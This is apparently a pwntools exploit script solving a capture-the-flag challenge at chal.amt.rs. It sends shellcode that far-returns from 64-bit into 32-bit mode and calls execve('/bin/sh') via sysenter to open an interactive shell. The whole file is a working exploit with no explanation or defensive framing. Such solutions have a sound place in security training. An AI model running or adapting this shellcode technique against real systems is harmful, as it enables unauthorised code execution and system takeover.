from pwn import *

HOST = 'chal.amt.rs'
PORT = 1341

exe = ELF('./chal_patched')
libc = ELF('./lib/libc.so.6')

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

gs = '''
b main
c
'''

def start():
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)  
    else:
        return process([exe.path])

io = start()

code = asm(f'''
    mov rsp, 0x1337010
    retfd
''', arch = "amd64", bits = 64)
code += b'\x90' * (0x10 - (len(code) % 0x10))
code += p32(0x1337020) + p32(0x23)
code += b'\x90' * (0x10 - (len(code) % 0x10))
code += asm(f'''
    mov ebx, 0x1337040
    mov ecx, 0x1337048
    mov edx, 0x133704c
    mov eax, 11
    mov ebp, esp
    sysenter
''', arch = "x86", bits = 32)
code += b'\x90' * (0x10 - (len(code) % 0x10))
log.info(disasm(code))
code += b'/bin/sh\0' + p32(0x1337020) + p32(0)

io.sendafter(b'> ', code.ljust(0x1000, b'\x90'))
io.interactive()
